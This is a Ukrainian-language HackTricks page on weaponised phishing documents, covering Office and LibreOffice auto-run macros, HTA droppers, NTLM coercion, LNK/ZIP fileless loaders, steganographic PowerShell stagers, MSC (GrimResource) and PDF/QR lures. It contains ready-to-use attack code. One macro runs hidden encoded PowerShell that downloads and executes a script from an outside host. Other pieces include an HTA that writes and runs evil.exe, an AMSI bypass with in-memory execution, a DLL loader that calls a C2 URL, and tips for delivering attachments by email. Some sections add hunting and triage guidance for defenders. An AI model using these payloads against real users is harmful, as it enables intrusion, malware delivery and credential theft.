# Фішингові файли та документи

{{#include ../../banners/hacktricks-training.md}}

## Документи Office

Microsoft Word виконує перевірку даних файлу перед його відкриттям. Перевірка даних виконується у формі ідентифікації структури даних відповідно до стандарту OfficeOpenXML. Якщо під час ідентифікації структури даних виникає помилка, файл, що аналізується, не буде відкрито.

Зазвичай файли Word, які містять макроси, використовують розширення `.docm`. Однак файл можна перейменувати, змінивши розширення, і водночас зберегти його можливість виконувати макроси.\
Наприклад, файл RTF за задумом не підтримує макроси, але файл DOCM, перейменований на RTF, буде оброблятися Microsoft Word і зможе виконувати макроси.\
Ті самі внутрішні компоненти та механізми застосовуються до всього програмного забезпечення Microsoft Office Suite (Excel, PowerPoint тощо).

Ви можете використати наведену нижче команду, щоб перевірити, які розширення виконуватимуться деякими програмами Office:
```bash
assoc | findstr /i "word excel powerp"
```
Файли DOCX, що посилаються на віддалений шаблон (File –Options –Add-ins –Manage: Templates –Go), який містить macros, також можуть «виконувати» macros.

### Завантаження зовнішнього зображення

Перейдіть до: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, і **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Завантаження зовнішнього зображення: Перейдіть до: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Можна використовувати macros для виконання довільного коду з документа.

#### Автозавантажувальні функції

Що частіше вони використовуються, то вища ймовірність, що AV їх виявить.

- AutoOpen()
- Document_Open()

#### Приклади коду Macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Видалення metadata вручну

Перейдіть до **File > Info > Inspect Document > Inspect Document**, щоб відкрити Document Inspector. Натисніть **Inspect**, а потім **Remove All** поруч із **Document Properties and Personal Information**.

#### Розширення документа

Після завершення виберіть розкривний список **Save as type** і змініть формат із **`.docx`** на Word 97-2003 **`.doc`**.\
Зробіть це, оскільки **не можна зберігати macro всередині `.docx`**, а розширення з підтримкою macro **`.docm`** має **стигму** **навколо себе** (наприклад, значок ескізу містить великий `!`, а деякі web/email gateway повністю блокують такі файли). Тому це **legacy-розширення `.doc` є найкращим компромісом**.

#### Генератори шкідливих Macros

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Автоматичний запуск macros LibreOffice ODT (Basic)

Документи LibreOffice Writer можуть містити Basic macros і автоматично виконувати їх під час відкриття файлу, прив’язавши macro до події **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Проста macro reverse shell має такий вигляд:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Зверніть увагу на подвійні лапки (`""`) усередині рядка — LibreOffice Basic використовує їх для екранування літеральних лапок, тому payload-и, що закінчуються на `...==""")`, зберігають збалансованими і внутрішню команду, і аргумент Shell.

Поради щодо доставки:

- Збережіть файл як `.odt` і прив’яжіть macro до події документа, щоб він запускався одразу після відкриття.
- Під час надсилання електронного листа за допомогою `swaks` використовуйте `--attach @resume.odt` (символ `@` потрібен, щоб як attachment надсилалися байти файлу, а не рядок із назвою файлу). Це критично важливо під час зловживання SMTP-серверами, які приймають довільних одержувачів `RCPT TO` без перевірки.

## HTA Files

HTA — це програма Windows, яка **поєднує HTML і scripting languages (наприклад, VBScript і JScript)**. Вона генерує інтерфейс користувача та виконується як "fully trusted" application, без обмежень моделі безпеки браузера.

HTA виконується за допомогою **`mshta.exe`**, який зазвичай **встановлюється** разом з **Internet Explorer**, через що **`mshta` залежить від IE**. Тому, якщо його було видалено, HTA не зможуть виконуватися.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Примусова автентифікація NTLM

Існує кілька способів **примусово ініціювати автентифікацію NTLM «віддалено»**. Наприклад, можна додати **невидимі зображення** до електронних листів або HTML, які користувач відкриє (навіть через HTTP MitM?). Або надіслати жертві **адресу файлів**, які **ініціюють** **автентифікацію** лише під час **відкриття папки.**

**Ознайомтеся з цими та іншими ідеями на таких сторінках:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Не забувайте, що можна не лише викрасти хеш або автентифікацію, а й **виконувати атаки NTLM relay**:

- [**Атаки NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay до сертифікатів)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + Payloads, вбудовані в ZIP (безфайловий ланцюжок)

Високоефективні кампанії доставляють ZIP-архів, що містить два легітимні документи-прикриття (PDF/DOCX) і шкідливий .lnk. Суть полягає в тому, що фактичний PowerShell loader зберігається в необроблених байтах ZIP після унікального маркера, а .lnk витягує його та запускає повністю в пам’яті.<sup>[[2]](#references)</sup>

Типовий процес, реалізований однорядковою командою PowerShell у .lnk:

1) Знайти оригінальний ZIP у поширених шляхах: Desktop, Downloads, Documents, %TEMP%, %ProgramData% і батьківській папці поточного робочого каталогу.
2) Прочитати байти ZIP і знайти жорстко заданий маркер (наприклад, xFIQCV). Усе після маркера є вбудованим PowerShell payload.
3) Скопіювати ZIP до %ProgramData%, розпакувати його там і відкрити документ-прикриття .docx, щоб усе виглядало легітимно.
4) Обійти AMSI для поточного процесу: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Деобфускувати наступний етап (наприклад, видалити всі символи #) і виконати його в пам’яті.

Приклад каркаса PowerShell для вилучення та запуску вбудованого етапу:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Нотатки
- Доставка часто зловживає піддоменами надійних PaaS (наприклад, *.herokuapp.com) і може фільтрувати payload-и (надавати нешкідливі ZIP-файли залежно від IP/UA).
- Наступний етап часто розшифровує shellcode у форматі base64/XOR і виконує його через Reflection.Emit + VirtualAlloc, щоб мінімізувати артефакти на диску.

Persistence, що використовується в тому самому ланцюжку
- Перехоплення COM TypeLib для Microsoft Web Browser control, унаслідок чого IE/Explorer або будь-який застосунок, що його вбудовує, автоматично повторно запускає payload.<sup>[[2]](#references)[[4]](#references)</sup> Деталі та готові до використання команди наведено тут:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Пошук/IOC
- ZIP-файли, що містять ASCII-маркер (наприклад, xFIQCV), доданий до даних архіву.
- .lnk, який перебирає батьківські папки та папки користувача, щоб знайти ZIP, і відкриває документ-приманку.
- Підміна AMSI через [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Тривалі ділові листування, що завершуються посиланнями, розміщеними в доменах надійних PaaS.

## Постановка LNK із пріоритетом decoy → Persistence через scheduled task → side-loading довіреного CPL

Інший поширений шаблон — це **`.lnk`, що імітує документ**, який одразу відкриває нешкідливу приманку, паралельно готуючи справжній ланцюжок у фоновому режимі.<sup>[[3]](#references)</sup>

Спостережуваний workflow:
1. Ярлик **маскується під PDF** і використовує `conhost.exe` або подібний proxy для запуску обфускованого PowerShell downloader.
2. PowerShell фрагментує очевидні токени (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), тому наївні засоби виявлення, що шукають `iwr`, `gci`, `ren`, `cpi` або `schtasks`, пропускають цю команду.
3. Stager спочатку завантажує **документ-приманку**, відкриває його для жертви, а потім у фоновому режимі відновлює шкідливі файли.
4. Payload-и можуть записуватися з **неправдоподібними розширеннями**, а потім перейменовуватися шляхом видалення заповнювальних символів, що відкладає появу очевидних артефактів `.exe` / `.cpl`.
5. Persistence встановлюється за допомогою **scheduled task із запуском щохвилини**, який запускає довірений host binary із шляху, доступного для запису користувачем.

Мінімальні підказки для пошуку за цим шаблоном:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Корисний layout staging, який варто розпізнавати:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` або `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Чому друга стадія є непомітною

У case study Rapid7 заплановане завдання неодноразово запускало **`Fondue.exe`** з `C:\Users\Public\`. Оскільки **`APPWIZ.cpl`** було розміщено поруч і воно експортувало **`RunFODW`**, довірений бінарний файл Microsoft завантажував CPL attacker замість легітимної системної копії.

Потім CPL:
- Зчитує blob **AES-256-CBC** з `C:\Windows\Tasks\editor.dat`
- Розшифровує його через **Windows CNG / `bcrypt.dll`**
- Виділяє executable memory і копіює туди розшифрований shellcode
- Опосередковано запускає його, передаючи вказівник на shellcode як callback для **`EnumUILanguagesW`**

Останній крок варто шукати окремо: malware часто уникає прямого переходу `((void(*)())buf)()` і натомість зловживає **легітимним WinAPI, який приймає callback**, щоб передати керування.

Розшифрованим payload у цій кампанії був shellcode **Donut**, який потім повністю відображав фінальний PE у memory і патчив **AMSI/WLDP/ETW** у поточному процесі перед передачею керування. Докладніші нотатки щодо side-loading і post-processing у memory дивіться тут:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Практичні напрямки для hunting:
- `.lnk`, який запускає `powershell.exe` або `conhost.exe`, після чого відкривається видимий decoy-документ.
- Короткоживучі downloads до **`C:\Users\Public\`**, після яких одразу виконуються перейменування з nonsense extensions.
- Scheduled tasks із нейтральними назвами, такими як `GoogleErrorReport`, які запускаються з **user-writable directories**.
- Довірені бінарні файли, які завантажують **`.cpl` / `.dll`** із того самого non-system directory.
- Base64 text blobs, записані в **`C:\Windows\Tasks\`**, а потім зчитані side-loaded module.

## Payloads, розділені steganography, у зображеннях (PowerShell stager)

Сучасні loader chains доставляють obfuscated JavaScript/VBS, який декодує та запускає Base64 PowerShell stager. Цей stager завантажує image (часто GIF), що містить Base64-encoded .NET DLL, прихований як plain text між унікальними start/end markers. Script шукає ці delimiters (приклади, зафіксовані у wild: «<<sudo_png>> … <<sudo_odt>>>»), витягує текст між ними, Base64-декодує його в bytes, завантажує assembly в-memory і викликає відомий entry method із C2 URL.<sup>[[5]](#references)</sup>

Workflow
- Stage 1: Archived JS/VBS dropper → декодує embedded Base64 → запускає PowerShell stager з -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → завантажує image, витягує marker-delimited Base64, завантажує .NET DLL в-memory і викликає його method (наприклад, VAI), передаючи C2 URL та options.
- Stage 3: Loader отримує final payload і зазвичай inject-ить його через process hollowing у trusted binary (зазвичай MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Дізнайтеся більше про process hollowing і trusted utility proxy execution тут:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Приклад PowerShell для вилучення DLL із image та виклику .NET method в-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Примітки
- Це ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Маркери відрізняються залежно від кампанії.
- AMSI/ETW bypass і string deobfuscation зазвичай застосовуються перед завантаженням assembly.
- Пошук: сканувати завантажені зображення на наявність відомих роздільників; виявляти PowerShell, який звертається до зображень і негайно декодує Base64 blobs.

Також дивіться stego-інструменти й техніки carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Поширеним початковим етапом є невеликий, сильно обфускований `.js` або `.vbs`, доставлений усередині архіву. Його єдина мета — декодувати вбудований Base64 string і запустити PowerShell з `-nop -w hidden -ep bypass`, щоб ініціалізувати наступний етап через HTTPS.<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- Прочитати вміст власного файлу
- Знайти Base64 blob між рядками сміття
- Декодувати в ASCII PowerShell
- Виконати за допомогою `wscript.exe`/`cscript.exe`, викликавши `powershell.exe`

Ознаки для пошуку
- Архівні JS/VBS attachments, які запускають `powershell.exe` з `-enc`/`FromBase64String` у командному рядку.
- `wscript.exe`, який запускає `powershell.exe -nop -w hidden` із user temp paths.

## MSC documents as execution containers (GrimResource)

Файли Microsoft Management Console (`.msc`) — це XML-визначення консолі, які зазвичай відкриваються через `mmc.exe`. **GrimResource** weaponizes посилання `StringTable` на ресурс `apds.dll`, що містить старий XSS primitive, тому відкриття користувачем створеної зловмисної консолі спричиняє виконання JavaScript усередині `mmc.exe`. У виявлених samples обфускація на основі `transformNode` поєднувалася з **DotNetToJScript** для інстанціювання .NET payload без стандартного Office-macro path.<sup>[[9]](#references)</sup>

Для static triage розглядайте недовірений MSC як текст і **не** відкривайте його подвійним клацанням:<sup>[[9]](#references)</sup>
```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```
Високосигнальними runtime-переходами є завантаження `mmc.exe` CLR або скриптових компонентів, створення мережевих підключень або запуск `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` чи неочікуваного виконуваного файлу. Формат є легітимним, тому виявлення має корелювати **джерело + підозрілий XML/скриптовий вміст + поведінку `mmc.exe`**, а не блокувати кожен MSC-файл.<sup>[[9]](#references)</sup>

## PDF/QR-редиректори та керування доставкою payload

PDF не потребує exploit, щоб бути корисним. У нещодавніх кампаніях у документі, що виглядає нешкідливим, розміщують **QR-код або звичайне посилання**, переводять browser session за межі mail-контролів і персоналізують destination адресою одержувача. Microsoft задокументувала PDF-файли 2025 року, чиї QR URL були унікальними для кожного одержувача та вели до інфраструктури викрадення облікових даних RaccoonO365; паралельний ланцюжок використовував IP/environment gating, щоб повертати вибраним відвідувачам шлях JavaScript/MSI, а сканерам або забороненим клієнтам — нешкідливий PDF.<sup>[[10]](#references)</sup>

Під час triage перевіряйте і дії PDF, і відрендерені QR-коди. QR-код може бути намальований у векторному форматі, а не збережений як зображення, доступне для вилучення, тому растеризуйте кожну сторінку, а також витягуйте вбудовані зображення:
```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```
Перевіряйте декодовані призначення та перенаправлення з ізольованої системи аналізу без автентифікації. Корисні ознаки для пошуку включають PDF-файли лише з QR-кодом і майже порожнім текстом листа, email отримувача, вбудований у параметр запиту, кілька перенаправлень через авторитетні хостинги, а також різний вміст залежно від IP, геолокації, cookies, referrer або user agent. Порівнюйте запити з контрольованими профілями, оскільки під час одного отримання даних sandbox може бути повернено лише decoy.<sup>[[10]](#references)</sup>

## Файли Windows для викрадення NTLM-хешів

Перегляньте сторінку про **місця для викрадення NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – макрос LibreOffice → вебшелл IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – кампанія ZipLine: складна фішингова атака, спрямована на компанії США](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: відстеження tradecraft Dropping Elephant через ланцюжок loader-ів на тему Китаю](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – нова техніка COM persistence (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader доставляє низку infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console для початкового доступу та ухилення](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – загрозливі суб’єкти використовують податковий сезон для розгортання фішингових кампаній на податкову тематику](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
